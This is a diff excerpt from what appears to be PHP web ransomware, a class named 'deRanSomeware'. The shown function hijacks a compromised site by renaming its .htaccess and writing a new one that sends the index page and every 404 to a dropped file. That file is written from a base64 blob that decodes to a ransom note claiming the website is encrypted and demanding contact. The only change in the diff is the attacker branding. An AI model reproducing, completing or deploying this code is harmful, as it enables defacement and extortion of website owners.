@@ -43,7 +43,7 @@ class deRanSomeware
    public function shcpackInstall(){
     if(!file_exists(".htaun5t48l3")){
       rename(".htaccess", ".htaun5t48l3");
-      if(fwrite(fopen('.htaccess', 'w'), "#Bug7sec Team\r\nDirectoryIndex un5t48l3.php\r\nErrorDocument 404 /un5t48l3.php")){
+      if(fwrite(fopen('.htaccess', 'w'), "#UN5T48L3 \r\nDirectoryIndex un5t48l3.php\r\nErrorDocument 404 /un5t48l3.php")){
             echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
       }
       if(file_put_contents("un5t48l3.php", base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgPHRpdGxlPlVONVQ0OEwzPC90aXRsZT4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYm9keSB7CiAgICBiYWNrZ3JvdW5kOiAjMDAwMDAwOwogICAgY29sb3I6ICNlMmUyZTI7Cn0KYXsKICAgY29sb3I6Z3JlZW47Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPGEgaHJlZj0iaHR0cHM6Ly93d3cudW41dDQ4bDMuY29tLyI+CjxpbWcgYm9yZGVyPSIwIiBhbHQ9IlczU2Nob29scyIgc3JjPSJodHRwczovL3d3dy51bjV0NDhsMy5jb20vbG9jYWwuanBnIj4KPC9hPgo8cHJlPgpZb3VyIHdlYnNpdGUgaXMgc2FmZWx5IGVuY3J5cHRlZCBieSBVTjVUNDhMMywgcGxlYXNlIGNvbnRhY3Qgd2l0aCBtZToKICAgICAtWyA8Zm9udCBjb2xvcj0iZ3JlZW4iPmlsZXRpc2ltQFVONVQ0OEwzLmNvbTwvZm9udD4gXS0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQpNb3JlIGluZm9ybWF0aW9uIGFib3V0IDxhIGhyZWY9Imh0dHBzOi8vVU41VDQ4TDMuY29tL1BIUF9SYW5zb213YXJlIj5SYW5zb213YXJlPC9hPi48YnI+CllvdSBjYW4gcmVzdG9yZSB5b3VyIHN5c3RlbSBiYWNrLgpCdXQsIGZpcnN0IHlvdSBuZWVkIHRvIGNvbnRhY3Qgd2l0aCBtZS4KPC9wcmU+CjwvY2VudGVyPgo8L2JvZHk+CjwvaHRtbD4="))){
